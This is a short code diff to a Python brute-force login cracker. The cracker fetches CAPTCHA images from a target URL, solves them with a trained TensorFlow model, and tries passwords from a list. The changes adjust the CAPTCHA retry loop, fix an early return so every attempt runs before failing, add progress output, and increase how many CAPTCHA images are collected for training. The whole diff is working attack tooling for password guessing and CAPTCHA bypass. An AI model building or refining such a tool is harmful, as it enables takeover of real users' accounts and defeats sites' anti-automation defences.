@@ -34,8 +34,9 @@ class BruteForceCracker:
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, password, num_iter=4):
+    def crack(self, password, num_iter=2):
         for i in range(num_iter) : 
+            print("--------- {} captcha try -------------".format(i+1))
             current_captcha = retrieve_captcha_images(self.url, number_iter=1)
             tfds_captcha = convert_to_tfds(current_captcha)
             preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
@@ -47,8 +48,8 @@ class BruteForceCracker:
                 print("Username: ---> " + self.username)
                 print("Password: ---> " + password)
                 return True
-            else :
-                return False
+        print("\n")
+        return False
 
 def crack_passwords(passwords, cracker):
     count = 0
@@ -59,7 +60,7 @@ def crack_passwords(passwords, cracker):
         if cracker.crack(password):
             return
     print("No Password Found !")
-def retrieve_captcha_images(url, number_iter=200) : 
+def retrieve_captcha_images(url, number_iter=300) : 
     img_url = []
     for _ in range(number_iter) : 
         response = requests.get(url)
